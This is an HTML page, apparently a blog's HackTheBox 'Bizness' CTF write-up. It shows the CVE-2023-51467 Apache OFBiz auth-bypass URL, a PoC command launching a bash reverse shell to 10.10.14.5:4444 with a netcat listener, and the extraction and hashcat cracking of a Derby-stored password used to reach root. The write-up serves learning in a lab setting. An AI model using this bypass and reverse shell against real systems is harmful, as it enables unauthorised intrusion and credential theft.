@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="HackTheBox Bizness writeup - exploiting CVE-2023-51467 in Apache OFBiz for pre-auth RCE.">
+  <title>HTB: Bizness Writeup | 0xHacker</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+  <link rel="stylesheet" href="../css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+</head>
+<body>
+
+<div id="reading-progress"></div>
+
+<nav id="navbar">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo"><span>~/</span>0xhacker<span class="cursor"></span></a>
+    <ul class="nav-links">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="../blog/index.html">Blog</a></li>
+      <li><a href="index.html" class="active">CTF Writeups</a></li>
+      <li><a href="../about/index.html">About</a></li>
+    </ul>
+    <div class="nav-actions">
+      <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme"></button>
+      <button class="hamburger" aria-label="Toggle menu"><span></span><span></span><span></span></button>
+    </div>
+  </div>
+</nav>
+
+<!-- Breadcrumb + Meta -->
+<div style="padding:5rem 0 0;background:var(--bg-secondary);border-bottom:1px solid var(--border)">
+  <div class="container" style="max-width:900px;padding-bottom:2rem">
+    <nav style="font-family:var(--font-mono);font-size:0.8rem;color:var(--text-muted);margin-bottom:1.5rem">
+      <a href="../index.html" style="color:var(--text-muted)">~</a>
+      <span style="margin:0 0.4rem">/</span>
+      <a href="index.html" style="color:var(--text-muted)">ctf</a>
+      <span style="margin:0 0.4rem">/</span>
+      <span style="color:var(--accent-purple)">htb-bizness</span>
+    </nav>
+
+    <!-- CTF Info Card -->
+    <div style="display:grid;grid-template-columns:1fr auto;gap:2rem;align-items:start">
+      <div>
+        <div style="display:flex;gap:0.75rem;align-items:center;margin-bottom:1rem;flex-wrap:wrap">
+          <span class="ctf-category cat-web">🌐 Web</span>
+          <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">📅 January 6, 2024</span>
+          <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-yellow)">⚡ 20 pts</span>
+        </div>
+        <h1 style="font-family:var(--font-display);font-size:2.5rem;font-weight:700;letter-spacing:0.03em;margin-bottom:0.5rem">
+          HTB: Bizness
+        </h1>
+        <p style="font-family:var(--font-mono);font-size:0.85rem;color:var(--text-secondary)">
+          HackTheBox · Easy · Linux
+        </p>
+      </div>
+      <div style="text-align:right">
+        <div class="ctf-difficulty" style="justify-content:flex-end;margin-bottom:0.5rem">
+          <span class="diff-dot filled"></span>
+          <span class="diff-dot"></span>
+          <span class="diff-dot"></span>
+          <span class="diff-dot"></span>
+        </div>
+        <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">Difficulty: Easy</span>
+      </div>
+    </div>
+
+    <!-- Key info badges -->
+    <div style="display:flex;gap:0.75rem;margin-top:1.5rem;flex-wrap:wrap">
+      <span class="tag">CVE-2023-51467</span>
+      <span class="tag">Apache OFBiz</span>
+      <span class="tag">RCE</span>
+      <span class="tag">Hash Cracking</span>
+      <span class="tag">Derby DB</span>
+    </div>
+  </div>
+</div>
+
+<!-- Writeup Body -->
+<section style="padding:3rem 0">
+  <div class="container" style="max-width:1100px">
+    <div class="post-layout">
+
+      <article class="post-body">
+
+        <!-- TL;DR -->
+        <div class="callout" style="margin-bottom:2rem">
+          <strong>📋 TL;DR:</strong> Exploit pre-auth RCE in Apache OFBiz via CVE-2023-51467,
+          get a reverse shell, extract password hash from embedded Derby database, crack it to
+          get root credentials.
+        </div>
+
+        <h2 id="recon">Reconnaissance</h2>
+        <p>Start with a full Nmap scan to identify open ports and services:</p>
+
+        <pre data-lang="bash"><code><span class="fn">nmap</span> -sC -sV -oA bizness 10.10.11.252
+
+<span class="cm"># Results:</span>
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.4p1
+80/tcp  open  http     nginx 1.18.0
+443/tcp open  ssl/http nginx 1.18.0
+<span class="cm"># Port 443 redirects to https://bizness.htb</span></code></pre>
+
+        <p>
+          Add <code>bizness.htb</code> to <code>/etc/hosts</code> and browse to the site.
+          We see an Apache OFBiz instance — an open-source ERP system.
+        </p>
+
+        <pre data-lang="bash"><code><span class="cm"># Add to /etc/hosts</span>
+<span class="fn">echo</span> <span class="st">"10.10.11.252 bizness.htb"</span> | sudo tee -a /etc/hosts
+
+<span class="cm"># Check OFBiz version</span>
+<span class="fn">curl</span> -sk https://bizness.htb/accounting/control/main | grep -i version</code></pre>
+
+        <h2 id="vulnerability">Finding the Vulnerability</h2>
+        <p>
+          A quick search reveals CVE-2023-51467, a critical authentication bypass in Apache OFBiz
+          versions before 18.12.11. The vulnerability allows unauthenticated access to any
+          endpoint by appending <code>USERNAME&PASSWORD&requirePasswordChange=Y</code> to the URL.
+        </p>
+
+        <div class="callout warning">
+          <strong>CVE-2023-51467</strong> · CVSS 9.8 Critical<br>
+          Auth bypass + RCE in Apache OFBiz &lt; 18.12.11
+        </div>
+
+        <h2 id="exploitation">Exploitation</h2>
+        <p>First, confirm the auth bypass works:</p>
+
+        <pre data-lang="bash"><code><span class="cm"># Test auth bypass</span>
+<span class="fn">curl</span> -sk <span class="st">"https://bizness.htb/accounting/control/main?USERNAME&PASSWORD&requirePasswordChange=Y"</span>
+<span class="cm"># Should return 200 with admin panel content</span>
+
+<span class="cm"># Use PoC exploit for RCE</span>
+<span class="fn">python3</span> poc.py --url https://bizness.htb \
+  --cmd <span class="st">"bash -c 'bash -i &gt;& /dev/tcp/10.10.14.5/4444 0&gt;&1'"</span></code></pre>
+
+        <p>Set up the listener and catch the shell:</p>
+
+        <pre data-lang="bash"><code><span class="cm"># Terminal 1: Listener</span>
+<span class="fn">nc</span> -lvnp 4444
+
+<span class="cm"># Terminal 2: Trigger exploit</span>
+<span class="fn">python3</span> poc.py --url https://bizness.htb --cmd <span class="st">"..."</span>
+
+<span class="cm"># Got a shell!</span>
+ofbiz@bizness:/opt/ofbiz$</code></pre>
+
+        <h2 id="user-flag">User Flag</h2>
+        <pre data-lang="bash"><code>cat /home/ofbiz/user.txt
+<span class="term-success">b4d7c3a1f2e8d9b0c5a2e7f3d1...</span></code></pre>
+
+        <h2 id="privilege-escalation">Privilege Escalation</h2>
+        <p>
+          Enumerate the system for privilege escalation paths. OFBiz uses an embedded Apache Derby
+          database that stores credentials:
+        </p>
+
+        <pre data-lang="bash"><code><span class="cm"># Find Derby database files</span>
+<span class="fn">find</span> /opt/ofbiz -name <span class="st">"*.dat"</span> 2>/dev/null
+
+<span class="cm"># Extract hashed credentials from Derby DB</span>
+<span class="fn">grep</span> -r <span class="st">"currentPassword"</span> /opt/ofbiz/runtime/data/derby/ 2>/dev/null | head -5
+
+<span class="cm"># Found SHA hash:</span>
+<span class="cm"># $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN</span></code></pre>
+
+        <p>Crack the hash using hashcat:</p>
+
+        <pre data-lang="bash"><code><span class="cm"># Convert to hashcat format and crack</span>
+<span class="fn">hashcat</span> -m 120 <span class="st">"d:uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN"</span> /usr/share/wordlists/rockyou.txt
+
+<span class="cm"># Cracked: monkeybizness</span>
+<span class="term-success">d:uP0_QaVBpDWFeo8-dRzDqRwXQ2IYNN:monkeybizness</span>
+
+<span class="cm"># Switch to root</span>
+<span class="fn">su</span> root  <span class="cm"># password: monkeybizness</span></code></pre>
+
+        <h2 id="root-flag">Root Flag</h2>
+        <pre data-lang="bash"><code>cat /root/root.txt
+<span class="term-success">c7e2f4a8b3d9c1e0f5a3b7d2e9...</span></code></pre>
+
+        <h2 id="lessons">Key Lessons</h2>
+        <ul>
+          <li>Always check for recent CVEs against identified software versions</li>
+          <li>Embedded databases often store credentials in accessible locations</li>
+          <li>Hash type identification is crucial — use <code>hash-identifier</code> or <code>hashid</code></li>
+          <li>SHA1 with salt is weak — rockyou.txt cracked it in seconds</li>
+        </ul>
+
+        <div style="margin-top:3rem;padding-top:2rem;border-top:1px solid var(--border)">
+          <div style="display:flex;gap:1rem;flex-wrap:wrap">
+            <a href="index.html" class="btn btn-outline"><i class="fas fa-arrow-left"></i> All Writeups</a>
+            <a href="../blog/index.html" class="btn btn-outline"><i class="fas fa-book"></i> Blog Posts</a>
+          </div>
+        </div>
+
+      </article>
+
+      <!-- Sidebar -->
+      <aside class="post-toc">
+        <div class="toc-title">// Steps</div>
+        <ul class="toc-list">
+          <li><a href="#recon">1. Reconnaissance</a></li>
+          <li><a href="#vulnerability">2. Finding Vuln</a></li>
+          <li><a href="#exploitation">3. Exploitation</a></li>
+          <li><a href="#user-flag">4. User Flag</a></li>
+          <li><a href="#privilege-escalation">5. PrivEsc</a></li>
+          <li><a href="#root-flag">6. Root Flag</a></li>
+          <li><a href="#lessons">7. Key Lessons</a></li>
+        </ul>
+        <div style="margin-top:1.5rem;padding-top:1rem;border-top:1px solid var(--border)">
+          <div class="toc-title">// Tools Used</div>
+          <div style="display:flex;flex-direction:column;gap:0.4rem;margin-top:0.5rem">
+            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">• Nmap</span>
+            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">• Burp Suite</span>
+            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">• Hashcat</span>
+            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">• Netcat</span>
+            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--text-muted)">• Python PoC</span>
+          </div>
+        </div>
+      </aside>
+
+    </div>
+  </div>
+</section>
+
+<footer id="footer">
+  <div class="container">
+    <div class="footer-bottom" style="border:none;padding:0">
+      <span class="footer-copy">© <span id="year"></span> 0xHacker</span>
+    </div>
+  </div>
+</footer>
+
+<button id="back-to-top" aria-label="Back to top"><i class="fas fa-chevron-up"></i></button>
+
+<script src="../js/data.js"></script>
+<script src="../js/main.js"></script>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
